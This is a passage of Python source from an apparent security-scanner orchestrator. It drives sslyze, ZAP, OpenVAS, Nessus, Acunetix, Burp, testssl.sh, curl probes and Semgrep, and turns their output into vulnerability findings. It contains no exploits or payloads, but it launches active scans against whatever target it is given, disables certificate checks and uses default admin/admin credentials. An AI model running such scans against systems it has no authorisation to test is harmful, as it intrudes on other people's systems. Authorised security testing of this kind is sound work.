                    leaf = cert_chain[0].get("received_certificate_chain",[{}])
                    if leaf:
                        cert0 = leaf[0]
                        subject   = str(cert0.get("subject",""))
                        not_after = str(cert0.get("not_valid_after",""))
                        is_expired= cert0.get("is_certificate_valid",{}).get("is_certificate_verified",True) == False
                        issuer    = str(cert0.get("issuer",""))
                        san       = str(cert0.get("subject_alternative_names",[]))

                        if is_expired:
                            findings.append(make_finding("ssl",
                                "SSL Certificate Expired", "High",
                                f"Certificate for {hostname} expired on {not_after}.",
                                "Renew SSL certificate immediately.",
                                url=target, tool="sslyze", cwe="CWE-298"))

                        # Check if self-signed
                        if subject == issuer and "Let's Encrypt" not in issuer:
                            findings.append(make_finding("ssl",
                                "Self-Signed Certificate", "Medium",
                                f"Certificate is self-signed. Subject == Issuer: {subject[:80]}",
                                "Use a trusted CA certificate.",
                                url=target, tool="sslyze", cwe="CWE-295"))

                # Weak protocol detection
                for proto_key, proto_name in [
                    ("ssl_2_0_cipher_suites","SSLv2"),
                    ("ssl_3_0_cipher_suites","SSLv3"),
                    ("tls_1_0_cipher_suites","TLSv1.0"),
                    ("tls_1_1_cipher_suites","TLSv1.1"),
                ]:
                    proto_res = scan_res.get(proto_key,{}).get("result",{})
                    accepted  = proto_res.get("accepted_cipher_suites",[])
                    if accepted:
                        score, vector, _ = CVSS31.for_module("ssl")
                        sev = "High" if proto_name in ("SSLv2","SSLv3") else "Medium"
                        logger.log("SSLYZE", f"Weak protocol: {proto_name}", "WARNING")
                        findings.append(make_finding("ssl",
                            f"Weak Protocol Supported: {proto_name}", sev,
                            f"{proto_name} is enabled with {len(accepted)} cipher suites. "
                            f"Examples: {[c.get('cipher_suite',{}).get('name','?') for c in accepted[:3]]}",
                            f"Disable {proto_name} immediately. Enforce TLS 1.2 minimum.",
                            url=target, tool="sslyze",
                            cwe="CWE-326", evidence=f"cvss={score} {vector}"))

                # Weak cipher detection (TLS 1.2)
                tls12 = scan_res.get("tls_1_2_cipher_suites",{}).get("result",{})
                for suite in tls12.get("accepted_cipher_suites",[]):
                    cn = suite.get("cipher_suite",{}).get("name","")
                    if any(w in cn.upper() for w in WEAK_CIPHERS):
                        findings.append(make_finding("ssl",
                            f"Weak Cipher Suite: {cn}", "Medium",
                            f"TLS 1.2 accepts weak cipher: {cn}.",
                            "Remove weak ciphers. Use ECDHE with AES-GCM only.",
                            url=target, tool="sslyze", cwe="CWE-327"))

                # Specific vulnerability checks
                vuln_checks = {
                    "heartbleed":    ("Heartbleed Vulnerable (CVE-2014-0160)",       "Critical", "CWE-119"),
                    "openssl_ccs":   ("OpenSSL CCS Injection (CVE-2014-0224)",       "High",     "CVE-2014-0224"),
                    "robot":         ("ROBOT Attack Vulnerable",                      "High",     "CWE-326"),
                    "tls_fallback_scsv":("Missing TLS_FALLBACK_SCSV",                "Medium",   "CWE-757"),
                    "session_renegotiation":("Insecure TLS Renegotiation",           "Medium",   "CWE-295"),
                }
                for check, (title, sev, cwe) in vuln_checks.items():
                    res = scan_res.get(check,{}).get("result",{})
                    is_vuln = (res.get("is_vulnerable_to_heartbleed") or
                               res.get("is_vulnerable_to_ccs_injection") or
                               res.get("is_vulnerable_to_robot") or
                               (check == "tls_fallback_scsv" and
                                not res.get("supports_tls_fallback_scsv",True)) or
                               (check == "session_renegotiation" and
                                res.get("is_vulnerable",False)))
                    if is_vuln:
                        findings.append(make_finding("ssl", title, sev,
                            f"sslyze confirmed: {title}.",
                            "Apply vendor patch. Update OpenSSL.",
                            url=target, tool="sslyze", cwe=cwe, confidence="High"))

        except Exception as e:
            logger.log("SSLYZE", f"JSON parse error: {e}", "ERROR")

    logger.log("SSLYZE", f"v8 complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# OWASP ZAP — REST API integration (active + passive + AJAX spider)
# ─────────────────────────────────────────────────────────────────────────────
class ZAPClient:
    """OWASP ZAP REST API client — drives ZAP programmatically."""

    def __init__(self, api_url="http://localhost:8080", api_key=""):
        self.base    = api_url.rstrip("/")
        self.api_key = api_key
        self.session = __import__("requests").Session()
        self.session.headers["X-ZAP-API-Key"] = api_key

    def _get(self, path, **params):
        params["apikey"] = self.api_key
        try:
            r = self.session.get(f"{self.base}/{path}", params=params, timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception:
            return None

    def version(self): return self._get("JSON/core/view/version/")
    def new_session(self): return self._get("JSON/core/action/newSession/")
    def open_url(self, url): return self._get("JSON/core/action/accessUrl/", url=url)
    def spider_url(self, url, max_depth=5):
        return self._get("JSON/spider/action/scan/", url=url, maxDepth=max_depth)
    def ajax_spider(self, url):
        return self._get("JSON/ajaxSpider/action/scan/", url=url)
    def active_scan(self, url, policy=""):
        return self._get("JSON/ascan/action/scan/", url=url, scanPolicyName=policy)
    def passive_scan_wait(self):
        return self._get("JSON/pscan/action/enableAllScanners/")
    def get_alerts(self, base_url="", risk="", count=500):
        return self._get("JSON/alert/view/alerts/",
                          baseurl=base_url, risk=risk, count=count)
    def scan_status(self, scan_id):
        return self._get("JSON/ascan/view/status/", scanId=scan_id)
    def generate_report(self, report_type="json"):
        return self._get(f"JSON/reports/action/generate/", title="DD-ZAP",
                          template=report_type, reportDir="/tmp",
                          reportFileName="zap_report")


def tool_owasp_zap(target, workdir, zap_url="http://localhost:8080", zap_key=""):
    """
    OWASP ZAP REST API — full automated active + passive + AJAX spider scan.
    Requires ZAP running: zaproxy -daemon -port 8080 -config api.key=<key>
    Or Docker: docker run -d -p 8080:8080 ghcr.io/zaproxy/zaproxy:stable zaproxy -daemon -host 0.0.0.0 -port 8080 -config api.key=dd_key
    """
    findings = []
    logger.log("ZAP", f"OWASP ZAP scan: {target}", "TOOL")

    zap = ZAPClient(zap_url, zap_key)

    # Check if ZAP is running
    ver = zap.version()
    if not ver:
        logger.log("ZAP",
            "ZAP not reachable. Start ZAP: zaproxy -daemon -port 8080 -config api.key=<key>",
            "WARNING")
        return findings
    logger.log("ZAP", f"Connected to ZAP {ver.get('version','?')}", "SUCCESS")

    # 1. Spider
    logger.log("ZAP", "Spidering target …")
    spider = zap.spider_url(target, max_depth=5)
    if spider:
        spider_id = spider.get("scan","")
        # Wait for spider
        for _ in range(30):
            time.sleep(2)
            status = zap._get("JSON/spider/view/status/", scanId=spider_id)
            if status and int(status.get("status",0)) >= 100:
                break
        logger.log("ZAP", "Spider complete")

    # 2. AJAX Spider (for JavaScript-heavy apps)
    logger.log("ZAP", "AJAX spider …")
    zap.ajax_spider(target)
    time.sleep(10)

    # 3. Passive scan
    zap.passive_scan_wait()
    time.sleep(5)

    # 4. Active scan
    logger.log("ZAP", "Active scan …")
    ascan = zap.active_scan(target)
    if ascan:
        ascan_id = ascan.get("scan","")
        for _ in range(150):
            time.sleep(5)
            status = zap._get("JSON/ascan/view/status/", scanId=ascan_id)
            pct = int(status.get("status",0)) if status else 0
            if pct >= 100: break
            if pct % 20 == 0:
                logger.log("ZAP", f"Active scan: {pct}%")

    # 5. Get alerts
    alerts = zap.get_alerts(base_url=target, count=500)
    if not alerts or "alerts" not in alerts:
        logger.log("ZAP", "No alerts returned", "WARNING")
        return findings

    ZAP_RISK_MAP = {"High":"High","Medium":"Medium","Low":"Low","Informational":"Info"}
    seen = set()

    for alert in alerts.get("alerts",[]):
        alert_name = alert.get("name","")
        risk       = alert.get("risk","")
        confidence = alert.get("confidence","")
        url        = alert.get("url","")
        desc       = alert.get("description","")
        solution   = alert.get("solution","")
        reference  = alert.get("reference","")
        cwe_id     = alert.get("cweid","")
        wasc_id    = alert.get("wascid","")
        evidence   = alert.get("evidence","")
        param      = alert.get("param","")
        attack     = alert.get("attack","")
        plugin_id  = alert.get("pluginId","")

        if risk in ("False Positive",): continue
        sev = ZAP_RISK_MAP.get(risk,"Low")

        dedup = f"{plugin_id}:{url}:{param}"
        if dedup in seen: continue
        seen.add(dedup)

        logger.log("ZAP", f"[{sev}] {alert_name[:60]} @ {url[:50]}", "WARNING")
        findings.append(make_finding("xss" if "XSS" in alert_name
                                     else "sqli" if "SQL" in alert_name
                                     else "info_disclosure",
            f"ZAP [{plugin_id}]: {alert_name}", sev,
            f"{desc[:300]}. Evidence: {evidence[:100]}. "
            f"Param: {param}. Attack: {attack[:80]}.",
            solution[:200] or "Remediate per OWASP guidelines.",
            url=url, tool="zaproxy",
            payload=attack[:100],
            cwe=f"CWE-{cwe_id}" if cwe_id else "",
            evidence=f"plugin={plugin_id}, wasc={wasc_id}, confidence={confidence}"))

    logger.log("ZAP", f"ZAP complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# OPENVAS / GVM — REST API (Greenbone Vulnerability Manager 22.x)
# ─────────────────────────────────────────────────────────────────────────────
class OpenVASClient:
    """GVM 22.x REST API client for OpenVAS scanning."""

    def __init__(self, host="localhost", port=9390, username="admin", password="admin"):
        self.base = f"https://{host}:{port}"
        self.username = username
        self.password = password
        self.token    = None
        import requests as _rq
        self.session = _rq.Session()
        self.session.verify = False

    def login(self):
        try:
            r = self.session.post(f"{self.base}/login",
                json={"username":self.username,"password":self.password},
                timeout=15)
            if r.status_code == 200:
                self.token = r.json().get("token","")
                self.session.headers["Authorization"] = f"Bearer {self.token}"
                return True
        except Exception: pass
        return False

    def _get(self, path, **kwargs):
        try:
            r = self.session.get(f"{self.base}{path}", timeout=30, **kwargs)
            return r.json() if r.status_code == 200 else None
        except Exception: return None

    def _post(self, path, data):
        try:
            r = self.session.post(f"{self.base}{path}", json=data, timeout=30)
            return r.json() if r.status_code in (200,201) else None
        except Exception: return None

    def get_scan_configs(self): return self._get("/scan-configs")
    def create_target(self, host): return self._post("/targets", {"name":f"DD-{host}","hosts":host})
    def create_task(self, target_id, config_id="daba56c8-73ec-11df-a475-002264764cea"):
        return self._post("/tasks",{"name":"DD-OpenVAS","target_id":target_id,"config_id":config_id})
    def start_task(self, task_id): return self._post(f"/tasks/{task_id}/start",{})
    def task_status(self, task_id): return self._get(f"/tasks/{task_id}")
    def get_results(self, task_id): return self._get(f"/results?task_id={task_id}")


def tool_openvas(target, workdir, openvas_host="localhost", openvas_port=9390,
                 openvas_user="admin", openvas_pass="admin"):
    """
    OpenVAS (GVM 22.x) — comprehensive network vulnerability scanner.
    Requires Greenbone Community Edition: apt install openvas && gvm-setup
    """
    findings = []
    logger.log("OPENVAS", f"OpenVAS scan: {target}", "TOOL")

    gvm = OpenVASClient(openvas_host, openvas_port, openvas_user, openvas_pass)

    if not gvm.login():
        logger.log("OPENVAS",
            "Cannot connect to OpenVAS. Install: apt install openvas && sudo gvm-setup",
            "WARNING")
        return findings

    domain = get_domain(target)
    logger.log("OPENVAS", "Connected to OpenVAS GVM", "SUCCESS")

    # Create target
    target_resp = gvm.create_target(domain)
    if not target_resp:
        logger.log("OPENVAS", "Failed to create scan target", "ERROR")
        return findings

    target_id = target_resp.get("id","")
    if not target_id:
        logger.log("OPENVAS", "No target ID returned", "ERROR")
        return findings

    # Create and start task (Full and Fast config)
    FULL_FAST_CONFIG = "daba56c8-73ec-11df-a475-002264764cea"
    task_resp = gvm.create_task(target_id, FULL_FAST_CONFIG)
    if not task_resp: return findings

    task_id = task_resp.get("id","")
    gvm.start_task(task_id)
    logger.log("OPENVAS", f"Scan started. Task ID: {task_id}")

    # Poll for completion (max 30 min)
    for _ in range(180):
        time.sleep(10)
        status = gvm.task_status(task_id)
        if not status: continue
        state = status.get("status","")
        pct   = status.get("progress",0)
        if state == "Done": break
        if pct % 20 == 0:
            logger.log("OPENVAS", f"Progress: {pct}% ({state})")

    # Get results
    results = gvm.get_results(task_id)
    if not results: return findings

    SEV_MAP = {
        "10": "Critical", "9": "Critical",
        "8":  "High",     "7": "High",
        "6":  "Medium",   "5": "Medium",
        "4":  "Medium",   "3": "Low",
        "2":  "Low",      "1": "Info", "0": "Info",
    }

    for result in results.get("results",[]):
        name   = result.get("name","")
        desc   = result.get("description","")
        threat = result.get("threat","")
        sev_raw= str(result.get("severity","0")).split(".")[0]
        sev    = SEV_MAP.get(sev_raw, "Low")
        nvt_oid= result.get("nvt",{}).get("oid","")
        cves   = result.get("nvt",{}).get("cves",[])
        host   = result.get("host",{}).get("ip", domain)
        port   = result.get("port","")
        sol    = result.get("nvt",{}).get("solution","")

        if sev in ("Info",) and threat == "Log": continue

        logger.log("OPENVAS", f"[{sev}] {name[:60]}", "WARNING")
        findings.append(make_finding("recon",
            f"OpenVAS: {name}", sev,
            f"{desc[:300]}. Host: {host}:{port}. NVT: {nvt_oid}.",
            sol[:200] or "Apply vendor patch.",
            url=f"tcp://{host}:{port}" if port else target,
            tool="openvas",
            cwe=cves[0] if cves else "",
            evidence=f"nvt={nvt_oid}, threat={threat}, cves={cves[:3]}"))

    logger.log("OPENVAS", f"OpenVAS complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# NESSUS / TENABLE — REST API (local Nessus + Tenable.io cloud)
# ─────────────────────────────────────────────────────────────────────────────
class NessusClient:
    """Tenable Nessus REST API client (local Nessus + Tenable.io)."""

    def __init__(self, host="localhost", port=8834, access_key="", secret_key="",
                 use_cloud=False):
        self.base       = (f"https://cloud.tenable.com" if use_cloud
                           else f"https://{host}:{port}")
        self.access_key = access_key
        self.secret_key = secret_key
        self.use_cloud  = use_cloud
        import requests as _rq
        self.session    = _rq.Session()
        self.session.verify = False
        self.session.headers.update({
            "X-ApiKeys": f"accessKey={access_key};secretKey={secret_key}",
            "Content-Type": "application/json",
            "Accept": "application/json",
        })
        self.token      = None

    def login_local(self, username, password):
        """For local Nessus (username/password auth)."""
        try:
            r = self.session.post(f"{self.base}/session",
                json={"username":username,"password":password}, timeout=15)
            if r.status_code == 200:
                self.token = r.json().get("token","")
                self.session.headers["X-Cookie"] = f"token={self.token}"
                return True
        except Exception: pass
        return False

    def _get(self, path):
        try:
            r = self.session.get(f"{self.base}{path}", timeout=30)
            return r.json() if r.status_code == 200 else None
        except Exception: return None

    def _post(self, path, data):
        try:
            r = self.session.post(f"{self.base}{path}", json=data, timeout=30)
            return r.json() if r.status_code in (200,201) else None
        except Exception: return None

    def list_policies(self): return self._get("/policies")
    def create_scan(self, name, targets, policy_id, folder_id=None):
        payload = {
            "uuid": policy_id,
            "settings": {
                "name": name,
                "enabled": True,
                "text_targets": targets,
                "folder_id": folder_id or 0,
            }
        }
        return self._post("/scans", payload)
    def launch_scan(self, scan_id): return self._post(f"/scans/{scan_id}/launch", {})
    def scan_details(self, scan_id): return self._get(f"/scans/{scan_id}")
    def scan_hosts(self, scan_id): return self._get(f"/scans/{scan_id}/hosts")
    def host_details(self, scan_id, host_id):
        return self._get(f"/scans/{scan_id}/hosts/{host_id}")
    def export_scan(self, scan_id, fmt="nessus"):
        r = self._post(f"/scans/{scan_id}/export", {"format":fmt})
        return r.get("file","") if r else ""


def tool_nessus(target, workdir, nessus_host="localhost", nessus_port=8834,
                nessus_user="admin", nessus_pass="admin",
                access_key="", secret_key="", use_cloud=False):
    """
    Tenable Nessus / Tenable.io REST API.
    Local: python obsidian_core.py -u target --nessus-host localhost --nessus-user admin --nessus-pass pass
    Cloud: python obsidian_core.py -u target --tenable-access-key KEY --tenable-secret-key SECRET --tenable-cloud
    """
    findings = []
    logger.log("NESSUS", f"Nessus scan: {target}", "TOOL")

    client = NessusClient(nessus_host, nessus_port, access_key, secret_key, use_cloud)

    # Auth
    if access_key and secret_key:
        logger.log("NESSUS", "Using API key authentication")
    elif not client.login_local(nessus_user, nessus_pass):
        logger.log("NESSUS",
            "Cannot connect to Nessus. Ensure Nessus is running and credentials are correct.",
            "WARNING")
        return findings
    logger.log("NESSUS", "Connected to Nessus", "SUCCESS")

    # Find basic network scan policy
    domain = get_domain(target)
    policies = client.list_policies()
    policy_id = None
    if policies:
        for p in policies.get("policies",[]):
            if "basic" in p.get("name","").lower() or "network" in p.get("name","").lower():
                policy_id = p.get("template_uuid","")
                break
    if not policy_id:
        policy_id = "ad629e16-03b6-8c1d-cef6-ef8c9dd3c658"  # Basic Network Scan UUID

    # Create and launch scan
    scan_resp = client.create_scan(
        name=f"DD-Nessus-{domain[:20]}-{datetime.now().strftime('%H%M%S')}",
        targets=domain,
        policy_id=policy_id)

    if not scan_resp:
        logger.log("NESSUS", "Failed to create scan", "ERROR")
        return findings

    scan_id = scan_resp.get("scan",{}).get("id","")
    if not scan_id:
        logger.log("NESSUS", "No scan ID returned", "ERROR")
        return findings

    client.launch_scan(scan_id)
    logger.log("NESSUS", f"Nessus scan launched. ID: {scan_id}")

    # Poll for completion (max 30 min)
    for _ in range(180):
        time.sleep(10)
        details = client.scan_details(scan_id)
        if not details: continue
        status = details.get("info",{}).get("status","")
        if status in ("completed","canceled","aborted"): break
        logger.log("NESSUS", f"Status: {status} …")

    # Parse results
    details = client.scan_details(scan_id)
    if not details: return findings

    SEV_MAP = {4:"Critical",3:"High",2:"Medium",1:"Low",0:"Info"}

    for vuln in details.get("vulnerabilities",[]):
        sev_id = vuln.get("severity",0)
        sev    = SEV_MAP.get(sev_id,"Low")
        name   = vuln.get("plugin_name","")
        count  = vuln.get("count",0)
        family = vuln.get("plugin_family","")

        if sev == "Info": continue

        logger.log("NESSUS", f"[{sev}] {name[:60]} ({count} hosts)", "WARNING")
        findings.append(make_finding("recon",
            f"Nessus: {name}", sev,
            f"Nessus detected: {name}. Plugin family: {family}. Affected hosts: {count}.",
            "Apply Nessus remediation guidance for this plugin.",
            url=target, tool="nessus",
            evidence=f"plugin_family={family}, count={count}"))

    logger.log("NESSUS", f"Nessus complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# ACUNETIX — REST API v1
# ─────────────────────────────────────────────────────────────────────────────
def tool_acunetix(target, workdir, acunetix_url="https://localhost:3443",
                  api_key=""):
    """
    Acunetix Web Vulnerability Scanner — REST API v1.
    Requires Acunetix with API access.
    """
    findings = []
    logger.log("ACUNETIX", f"Acunetix scan: {target}", "TOOL")

    if not api_key:
        logger.log("ACUNETIX", "No API key. Set: --acunetix-key <key>", "WARNING")
        return findings

    import requests as _rq
    sess = _rq.Session()
    sess.verify = False
    sess.headers.update({
        "X-Auth": api_key,
        "Content-Type": "application/json",
    })
    base = acunetix_url.rstrip("/")

    try:
        # Check connection
        ver = sess.get(f"{base}/api/v1/info", timeout=10)
        if ver.status_code != 200:
            logger.log("ACUNETIX", "Cannot connect to Acunetix API", "WARNING")
            return findings

        # Create target
        t_resp = sess.post(f"{base}/api/v1/targets",
            json={"address":target,"description":"OBSIDIAN Scan","type":"default"},
            timeout=15)
        if t_resp.status_code not in (200,201):
            logger.log("ACUNETIX", f"Target creation failed: {t_resp.status_code}", "ERROR")
            return findings

        target_id = t_resp.json().get("target_id","")

        # Start full scan
        scan_resp = sess.post(f"{base}/api/v1/scans",
            json={"profile_id":"11111111-1111-1111-1111-111111111111",  # Full Scan
                  "target_id": target_id,
                  "schedule": {"disable": False,"start_date":None,"time_sensitive":False}},
            timeout=15)
        if scan_resp.status_code not in (200,201):
            return findings

        scan_id = scan_resp.json().get("scan_id","")
        logger.log("ACUNETIX", f"Scan started: {scan_id}")

        # Poll for completion (max 60 min)
        for _ in range(360):
            time.sleep(10)
            s = sess.get(f"{base}/api/v1/scans/{scan_id}", timeout=10)
            if s.status_code == 200:
                status = s.json().get("current_session",{}).get("status","")
                if status in ("completed","failed","aborted"): break

        # Get vulnerabilities
        vulns = sess.get(f"{base}/api/v1/vulnerabilities?query=severity!=info&l=500",
                         timeout=30)
        if vulns.status_code != 200: return findings

        SEV_MAP = {"critical":"Critical","high":"High","medium":"Medium","low":"Low","info":"Info"}
        for v in vulns.json().get("vulnerabilities",[]):
            sev   = SEV_MAP.get(v.get("severity","low").lower(),"Low")
            name  = v.get("affects_detail","")
            vt_id = v.get("vt_id","")
            url   = v.get("affects_url",target)
            desc  = v.get("description","")

            if sev == "Info": continue
            logger.log("ACUNETIX", f"[{sev}] {name[:60]}", "WARNING")
            findings.append(make_finding("xss" if "xss" in name.lower()
                                         else "sqli" if "sql" in name.lower()
                                         else "info_disclosure",
                f"Acunetix: {name}", sev,
                f"{desc[:200]}. VT: {vt_id}.",
                "Remediate per Acunetix guidance.",
                url=url, tool="acunetix", evidence=f"vt_id={vt_id}"))

    except Exception as e:
        logger.log("ACUNETIX", f"API error: {e}", "ERROR")

    logger.log("ACUNETIX", f"Complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# BURP SUITE — REST API (Enterprise / Professional)
# ─────────────────────────────────────────────────────────────────────────────
def tool_curl(target, session=None):
    """
    Raw-HTTP probe via the curl CLI. Covers what the requests-based modules
    handle awkwardly: dangerous HTTP methods (TRACE/XST, PUT, DELETE), the
    OPTIONS Allow list, and HTTP/2 negotiation. Gated on curl being present.
    """
    findings = []
    if not find_bin("curl"):
        return findings
    logger.log("CURL", "Raw HTTP probe (methods / XST / HTTP-2) ...", "TOOL")

    # 1) OPTIONS -> enumerate advertised methods
    opt = run_cmd(["curl", "-sk", "-m", "12", "-i", "-X", "OPTIONS", target], timeout=20)
    if opt and opt not in ("TIMEOUT", "NOT_FOUND"):
        allow = ""
        for line in opt.splitlines():
            if line.lower().startswith("allow:"):
                allow = line.split(":", 1)[1].strip()
        if allow:
            risky = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT", "PATCH")
                     if m in allow.upper()]
            if risky:
                findings.append(make_finding("http_methods",
                    f"Dangerous HTTP methods enabled: {', '.join(risky)}", "Medium",
                    f"Server advertises Allow: {allow}",
                    "Disable unused/dangerous HTTP methods at the server or WAF.",
                    url=target, payload="OPTIONS", cwe="CWE-650",
                    tool="curl", evidence=f"Allow: {allow}"))

    # 2) TRACE -> Cross-Site Tracing (XST)
    tr = run_cmd(["curl", "-sk", "-m", "12", "-i", "-X", "TRACE",
                  "-H", "X-OBSIDIAN-XST: probe", target], timeout=20)
    if tr and tr not in ("TIMEOUT", "NOT_FOUND"):
        first = tr.splitlines()[0] if tr.splitlines() else ""
        if "200" in first and "X-OBSIDIAN-XST: probe" in tr:
            findings.append(make_finding("http_methods",
                "HTTP TRACE enabled (Cross-Site Tracing / XST)", "Medium",
                "Server echoes the request back via TRACE, which can expose headers "
                "and cookies to Cross-Site Tracing.",
                "Disable the TRACE method on the web server.",
                url=target, payload="TRACE", cwe="CWE-693",
                tool="curl", evidence=first[:120]))

    # 3) HTTP/2 negotiation (informational)
    h2 = run_cmd(["curl", "-sk", "-m", "12", "-o", os.devnull,
                  "-w", "%{http_version}", "--http2", target], timeout=20)
    if h2 and h2.strip().startswith("2"):
        findings.append(make_finding("info_disclosure",
            "HTTP/2 supported", "Info",
            "Target negotiated HTTP/2.",
            "Informational. Ensure HTTP/2-specific protections (e.g. Rapid Reset / "
            "CVE-2023-44487 mitigation) are in place.",
            url=target, tool="curl", evidence=f"http_version={h2.strip()}"))

    logger.log("CURL", f"curl probe complete - {len(findings)} finding(s)", "SUCCESS")
    return findings


def tool_testssl(target, workdir):
    """testssl.sh - deep TLS/SSL configuration + vulnerability audit (HTTPS only)."""
    findings = []
    if not target.startswith("https://"):
        return findings
    bin_ = find_bin("testssl.sh") or find_bin("testssl")
    if not bin_:
        cand = TOOLS_DIR / "testssl.sh" / "testssl.sh"
        if cand.exists():
            bin_ = str(cand)
    if not bin_:
        return findings
    domain = get_domain(target)
    logger.log("TESTSSL", f"testssl.sh: {domain}", "TOOL")
    out_json = workdir / "testssl.json"
    run_cmd([bin_, "--quiet", "--color", "0", "--severity", "LOW",
             "--jsonfile", str(out_json), domain], timeout=300)
    if not out_json.exists():
        return findings
    try:
        data = json.loads(out_json.read_text(errors="ignore"))
    except Exception:
        return findings
    rows = data if isinstance(data, list) else data.get("scanResult", [])
    SEV = {"CRITICAL": "Critical", "HIGH": "High", "MEDIUM": "Medium", "LOW": "Low"}
    for item in rows:
        if not isinstance(item, dict):
            continue
        sev = SEV.get(str(item.get("severity", "")).upper())
        if not sev:
            continue
        fid = item.get("id", "tls")
        txt = item.get("finding", "")
        findings.append(make_finding("ssl", f"testssl: {fid}", sev,
            txt[:200], "Harden the TLS configuration per testssl.sh guidance.",
            url=target, tool="testssl.sh", cwe="CWE-326", evidence=txt[:160]))
    logger.log("TESTSSL", f"complete - {len(findings)} finding(s)", "SUCCESS")
    return findings


def tool_burpsuite(target, workdir, burp_url="http://localhost:1337", api_key=""):
    """
    Burp Suite integration - supports BOTH the community `burp-rest-api` REST
    service and the Burp Suite Enterprise GraphQL API. Launches a scan, polls to
    completion (bounded to 5 min), and maps issues to findings. Degrades
    gracefully when Burp is unreachable.
    """
    findings = []
    logger.log("BURP", f"Burp Suite scan: {target}", "TOOL")
    import requests as _rq
    base = burp_url.rstrip("/")
    sess = _rq.Session(); sess.verify = False
    sess.headers.update({"Content-Type": "application/json"})
    if api_key:
        sess.headers.update({"Authorization": f"Bearer {api_key}"})

    SEV_MAP = {"high": "High", "medium": "Medium", "low": "Low",
               "info": "Info", "information": "Info"}

    def _classify(name):
        n = (name or "").lower()
        if "sql" in n: return "sqli"
        if "xss" in n or "cross-site script" in n: return "xss"
        if "ssrf" in n: return "ssrf"
        if "traversal" in n or "lfi" in n or "file path" in n: return "lfi"
        return "info_disclosure"

    def _add(name, desc, sev, url, conf=""):
        mapped = SEV_MAP.get(str(sev).lower(), "Low")
        if mapped == "Info":
            return
        logger.log("BURP", f"[{mapped}] {str(name)[:60]}", "WARNING")
        findings.append(make_finding(_classify(name), f"Burp: {name}", mapped,
            (desc or "")[:240], "Remediate per Burp Suite issue guidance.",
            url=url or target, tool="burpsuite",
            evidence=(f"confidence={conf}" if conf else "")))

    # -- Mode 1: community burp-rest-api -------------------------------------
    try:
        r = sess.post(f"{base}/v0.1/scan", json={"urls": [target]}, timeout=15)
        if r.status_code in (200, 201):
            scan_id = ""
            loc = r.headers.get("Location", "")
            if loc:
                scan_id = loc.rstrip("/").split("/")[-1]
            if not scan_id:
                try:
                    j = r.json(); scan_id = str(j.get("scan_id") or j.get("id") or "")
                except Exception:
                    scan_id = ""
            scan_id = scan_id or "1"
            logger.log("BURP", f"REST scan {scan_id} launched - polling ...", "SUCCESS")
            deadline = time.time() + 300; last = {}
            while time.time() < deadline:
                time.sleep(10)
                s = sess.get(f"{base}/v0.1/scan/{scan_id}", timeout=15)
                if s.status_code != 200:
                    break
                last = s.json()
                if str(last.get("scanStatus", "")).lower() in ("succeeded", "failed", "paused"):
                    break
            for ev in (last.get("issueEvents") or []):
                iss = ev.get("issue", ev) or {}
                path = (iss.get("origin", "") + iss.get("path", "")) if iss.get("origin") else iss.get("path", "")
                _add(iss.get("name") or iss.get("issueType", ""),
                     iss.get("description", ""), iss.get("severity", "info"),
                     path, iss.get("confidence", ""))
            logger.log("BURP", f"REST complete - {len(findings)} finding(s)", "SUCCESS")
            return findings
    except Exception:
        pass  # fall through to the Enterprise GraphQL API

    # -- Mode 2: Burp Suite Enterprise GraphQL --------------------------------
    if not api_key:
        logger.log("BURP", "Burp REST not reachable and no --burp-key for the "
                   "Enterprise API - skipping", "WARNING")
        return findings
    GQL = base + "/api/graphql/v1"
    def gql(q, v=None):
        try:
            resp = sess.post(GQL, json={"query": q, "variables": v or {}}, timeout=30)
            return resp.json() if resp.status_code == 200 else None
        except Exception:
            return None
    if not gql("{ scan_configurations { id } }"):
        logger.log("BURP", "Cannot reach Burp Enterprise GraphQL - skipping", "WARNING")
        return findings
    site = gql('mutation { create_site(input:{name:"OBSIDIAN", scope:{included_urls:["%s"]}}) { site { id } } }' % target)
    site_id = (((site or {}).get("data") or {}).get("create_site") or {}).get("site", {}).get("id", "")
    if not site_id:
        logger.log("BURP", "Failed to create Burp site", "WARNING")
        return findings
    gql('mutation { create_scan(input:{site_id:"%s"}) { scan { id } } }' % site_id)
    logger.log("BURP", "Enterprise scan launched - polling ...")
    deadline = time.time() + 300; edges = []
    while time.time() < deadline:
        time.sleep(15)
        q = gql('query { issues(site_id:"%s"){ edges { node { issue_type{name description} severity confidence path } } } }' % site_id)
        if not q:
            continue
        edges = (((q.get("data") or {}).get("issues") or {}).get("edges") or [])
        if edges:
            break
    for e in edges:
        n = e.get("node", {}); it = n.get("issue_type", {})
        _add(it.get("name", ""), it.get("description", ""), n.get("severity", "info"),
             n.get("path", ""), n.get("confidence", ""))
    logger.log("BURP", f"Enterprise complete - {len(findings)} finding(s)", "SUCCESS")
    return findings



# ─────────────────────────────────────────────────────────────────────────────
# SEMGREP — SAST on extracted JavaScript/source code
# ─────────────────────────────────────────────────────────────────────────────
def tool_semgrep(target, workdir, session=None):
    """
    Semgrep SAST — runs on JS/source files extracted from the target.
    Downloads inline scripts, JS files, then runs semgrep security rules.
    """
    findings = []
    if not cmd_exists("semgrep"): return findings
    logger.log("SEMGREP", f"Semgrep SAST: {target}", "TOOL")

    import requests as _rq, tempfile as _tf

    src_dir = workdir / "semgrep_src"
    src_dir.mkdir(exist_ok=True)

    # Collect JS files from target
    sess = session or _rq.Session()
    sess.headers["User-Agent"] = DEFAULT_UA
    js_files_saved = 0

    try:
        resp = sess.get(target, timeout=TIMEOUT, verify=False)
        if not resp: return findings

        # Extract and save inline scripts
        for i, script in enumerate(re.findall(r'<script[^>]*>(.*?)</script>',
                                               resp.text, re.S | re.I)):
            if len(script.strip()) > 50:
                (src_dir / f"inline_{i}.js").write_text(script)
                js_files_saved += 1

        # Download external JS files
        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', resp.text, re.I)
        for j, js_url in enumerate(js_urls[:20]):
            full_url = urljoin(target, js_url)
            try:
                jr = sess.get(full_url, timeout=10, verify=False)
                if jr and jr.status_code == 200 and "javascript" in jr.headers.get("Content-Type",""):
